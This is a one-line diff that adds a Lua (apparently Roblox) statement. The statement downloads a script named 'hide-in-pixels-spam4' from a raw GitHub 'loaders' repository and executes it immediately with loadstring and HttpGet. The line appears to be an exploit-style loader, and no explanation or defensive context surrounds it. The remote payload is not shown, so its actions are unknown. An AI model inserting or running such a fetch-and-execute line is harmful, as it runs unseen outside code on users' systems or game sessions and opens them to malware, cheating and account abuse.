@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/hide-in-pixels-spam4-tqu9aup2gs13m9.lua"))()
